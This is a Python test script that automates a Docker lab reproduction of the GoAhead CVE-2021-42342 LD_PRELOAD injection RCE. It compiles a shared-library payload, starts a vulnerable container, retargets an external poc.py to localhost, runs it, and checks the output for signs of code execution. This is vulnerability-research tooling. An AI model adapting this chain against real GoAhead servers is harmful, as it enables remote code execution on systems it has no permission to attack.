#!/usr/bin/env python3
"""
GoAhead CVE-2021-42342 Docker PoC Test Script
Tests the complete vulnerability chain:
1. Start Docker container
2. Verify service is running
3. Compile payload
4. Run PoC and verify RCE
"""

import os
import sys
import subprocess
import time
import socket
from pathlib import Path

# Base paths
BASE_DIR = "/mnt/nvme/wj_code/dl_scan/awesome-hacking-lists/local_repos/vulnerability/GoAhead/CVE-2021-42342"
DOCKER_DIR = os.path.join(BASE_DIR, "docker")
PAYLOAD_C = os.path.join(BASE_DIR, "payload.c")
PAYLOAD_SO = os.path.join(DOCKER_DIR, "payload.so")
POC_PY = os.path.join(DOCKER_DIR, "poc.py")
DOCKER_COMPOSE = os.path.join(DOCKER_DIR, "docker-compose.yml")

# Test target
TARGET_URL = "http://localhost:8080/cgi-bin/index"
TARGET_HOST = "localhost"
TARGET_PORT = 8080


def print_step(msg):
    print(f"\n{'='*60}")
    print(f"[*] {msg}")
    print(f"{'='*60}\n")


def check_docker():
    """Check if Docker and docker-compose are available."""
    print_step("Checking Docker availability")

    try:
        result = subprocess.run(["docker", "--version"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"[+] Docker available: {result.stdout.strip()}")
        else:
            print("[-] Docker not available")
            return False
    except FileNotFoundError:
        print("[-] Docker command not found")
        return False

    try:
        result = subprocess.run(["docker-compose", "--version"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"[+] docker-compose available: {result.stdout.strip()}")
        else:
            print("[-] docker-compose not available")
            return False
    except FileNotFoundError:
        print("[-] docker-compose command not found")
        return False

    return True


def compile_payload():
    """Compile the LD_PRELOAD payload shared library."""
    print_step("Compiling payload.so")

    if not os.path.exists(PAYLOAD_C):
        print(f"[-] Payload source not found: {PAYLOAD_C}")
        return False

    try:
        result = subprocess.run(
            ["gcc", "-s", "-shared", "-fPIC", PAYLOAD_C, "-o", PAYLOAD_SO],
            capture_output=True,
            text=True,
            timeout=30
        )

        if result.returncode == 0:
            print(f"[+] Payload compiled successfully: {PAYLOAD_SO}")
            return True
        else:
            print(f"[-] Compilation failed: {result.stderr}")
            return False
    except FileNotFoundError:
        print("[-] gcc not found. Install with: apt-get install gcc")
        return False
    except subprocess.TimeoutExpired:
        print("[-] Compilation timeout")
        return False


def start_docker():
    """Start the GoAhead vulnerable container."""
    print_step("Starting Docker container")

    try:
        # Stop any existing containers first
        subprocess.run(
            ["docker-compose", "-f", DOCKER_COMPOSE, "down", "-v"],
            capture_output=True,
            cwd=DOCKER_DIR
        )

        # Start fresh container
        result = subprocess.run(
            ["docker-compose", "-f", DOCKER_COMPOSE, "up", "-d", "--force-recreate"],
            capture_output=True,
            text=True,
            timeout=60,
            cwd=DOCKER_DIR
        )

        if result.returncode == 0:
            print("[+] Container started successfully")
            return True
        else:
            print(f"[-] Failed to start container: {result.stderr}")
            return False
    except subprocess.TimeoutExpired:
        print("[-] Docker start timeout")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def wait_for_service(timeout=60):
    """Wait for the GoAhead service to be available."""
    print_step(f"Waiting for service on {TARGET_HOST}:{TARGET_PORT}")

    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_HOST, TARGET_PORT))
            sock.close()

            if result == 0:
                print(f"[+] Service is available on port {TARGET_PORT}")
                return True
        except Exception:
            pass

        print(".", end="", flush=True)
        time.sleep(2)

    print("\n[-] Service did not become available in time")
    return False


def check_http_service():
    """Check if HTTP service is responding."""
    print_step("Checking HTTP service")

    try:
        import requests
        resp = requests.get(f"http://{TARGET_HOST}:{TARGET_PORT}", timeout=10)
        print(f"[+] HTTP service responding with status: {resp.status_code}")

        # Check CGI endpoint
        cgi_resp = requests.get(f"http://{TARGET_HOST}:{TARGET_PORT}/cgi-bin/index", timeout=10)
        print(f"[+] CGI endpoint responding with status: {cgi_resp.status_code}")
        return True
    except ImportError:
        print("[-] requests module not available, using urllib")
        try:
            import urllib.request
            resp = urllib.request.urlopen(f"http://{TARGET_HOST}:{TARGET_PORT}", timeout=10)
            print(f"[+] HTTP service responding")
            return True
        except Exception as e:
            print(f"[-] HTTP check failed: {e}")
            return False
    except Exception as e:
        print(f"[-] HTTP check failed: {e}")
        return False


def run_poc():
    """Run the PoC script against the target."""
    print_step("Running PoC")

    if not os.path.exists(PAYLOAD_SO):
        print(f"[-] Payload not found: {PAYLOAD_SO}")
        return False

    # Update poc.py to use localhost
    poc_content = open(POC_PY, 'r').read()
    if "http://localhost:8080/cgi-bin/index" not in poc_content:
        # Modify the target URL in poc.py
        poc_content = poc_content.replace(
            "target = 'http://10.10.50.4:8080/cgi-bin/index'",
            "target = 'http://localhost:8080/cgi-bin/index'"
        )
        open(POC_PY, 'w').write(poc_content)
        print("[+] Updated PoC target to localhost")

    try:
        result = subprocess.run(
            ["python3", POC_PY],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=DOCKER_DIR
        )

        output = result.stdout + result.stderr
        print(f"PoC Output:\n{output}")

        if "Hacked" in output or "Hello: World" in output:
            print("[+] RCE verified - vulnerability confirmed!")
            return True
        else:
            print("[-] PoC did not show expected output")
            return False
    except subprocess.TimeoutExpired:
        print("[-] PoC timeout")
        return False
    except Exception as e:
        print(f"[-] PoC error: {e}")
        return False


def stop_docker():
    """Stop the Docker container."""
    print_step("Stopping Docker container")

    try:
        result = subprocess.run(
            ["docker-compose", "-f", DOCKER_COMPOSE, "down", "-v"],
            capture_output=True,
            text=True,
            timeout=30,
            cwd=DOCKER_DIR
        )
        print("[+] Container stopped")
        return True
    except Exception as e:
        print(f"[-] Error stopping container: {e}")
        return False


def main():
    """Main test function."""
    print("""
╔═══════════════════════════════════════════════════════════╗
║  GoAhead CVE-2021-42342 Docker PoC Test                  ║
║  LD_PRELOAD Environment Variable Injection RCE           ║
╚═══════════════════════════════════════════════════════════╝
    """)

    # Step 1: Check Docker
    if not check_docker():
        print("\n[-] Docker is not available. Cannot run automated test.")
        print("\nManual test instructions:")
        print(f"1. cd {DOCKER_DIR}")
        print("2. docker-compose up -d")
        print(f"3. gcc -s -shared -fPIC {PAYLOAD_C} -o {PAYLOAD_SO}")
        print(f"4. python3 {POC_PY} http://localhost:8080/cgi-bin/index {PAYLOAD_SO}")
        print("5. docker-compose down -v")
        return False

    # Step 2: Compile payload
    if not compile_payload():
        print("[-] Failed to compile payload")
        return False

    # Step 3: Start Docker
    if not start_docker():
        print("[-] Failed to start Docker container")
        return False

    # Step 4: Wait for service
    if not wait_for_service():
        print("[-] Service failed to start")
        stop_docker()
        return False

    # Step 5: Check HTTP service
    if not check_http_service():
        print("[-] HTTP service not responding")
        stop_docker()
        return False

    # Step 6: Run PoC
    if run_poc():
        print("\n" + "="*60)
        print("[+] SUCCESS: Vulnerability verified!")
        print("="*60)
    else:
        print("\n" + "="*60)
        print("[-] PoC did not produce expected results")
        print("="*60)

    # Cleanup
    stop_docker()

    return True


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
